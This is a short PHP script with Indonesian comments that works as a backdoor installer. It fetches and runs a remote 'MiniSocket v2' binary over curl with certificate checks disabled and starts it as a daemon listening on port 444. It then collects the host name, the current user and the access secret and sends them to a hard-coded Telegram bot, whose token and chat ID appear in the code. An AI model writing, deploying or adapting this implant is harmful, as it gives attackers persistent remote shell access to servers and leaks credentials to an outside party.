<?php

// Telegram Config
$TG_BOT_TOKEN = "8628717278:AAEcQd6vINfT95yNRv8tRD_u-51pFwDamqs";
$TG_CHAT_ID   = "1142721678";

function send_telegram($message) {
    global $TG_BOT_TOKEN, $TG_CHAT_ID;
    
    $url = "https://api.telegram.org/bot{$TG_BOT_TOKEN}/sendMessage";
    
    $data = [
        'chat_id'    => $TG_CHAT_ID,
        'text'       => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    curl_exec($ch);
    curl_close($ch);
}

// =============================================
// Mulai proses MiniSocket v2
// =============================================

echo "🚀 Menjalankan MiniSocket v2 (Port 444)...\n";

$command = 'curl -fsSLk -o ms https://minisocket.io/bin/mini-socketv2 && chmod 755 ms && S=$(./ms -g) && MINI_PORT=444 MINI_ARGS="-s $S -d" ./ms && echo "Connect with: mini-ncv2 -s $S"';

$output = [];
$exit_code = 0;

// Jalankan command melalui shell
exec($command . ' 2>&1', $output, $exit_code);
$full_output = implode("\n", $output);

// Ambil Secret Key
preg_match('/mini-ncv2 -s ([A-Za-z0-9]+)/', $full_output, $matches);
$secret = $matches[1] ?? '';

$hostname = gethostname();
$whoami   = trim(shell_exec('whoami'));

if (!empty($secret)) {
    $msg = "🟢 <b>MiniSocket v2 Berhasil!</b>\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "🖥 <b>Host:</b> <code>{$hostname}@{$whoami}</code>\n";
    $msg .= "🔌 <b>Port:</b> <code>444</code>\n";
    $msg .= "🔑 <b>Secret:</b> <code>{$secret}</code>\n";
    $msg .= "✅ Status: Running (Daemon)\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "Connect: <code>mini-ncv2 -s {$secret}</code>";

    file_put_contents('output.txt', $msg);
    send_telegram($msg);

    echo $msg . "\n";
    echo "Secret Key: {$secret}\n";

} else {
    $msg = "🔴 <b>MiniSocket v2 Gagal</b>\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "🖥 <b>Host:</b> <code>{$hostname}@{$whoami}</code>\n";
    $msg .= "❌ Status: Failed\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "Output:\n<pre>" . htmlspecialchars($full_output) . "</pre>";

    file_put_contents('output.txt', strip_tags($msg));
    send_telegram($msg);

    echo $msg . "\n";
    echo $full_output . "\n";
}
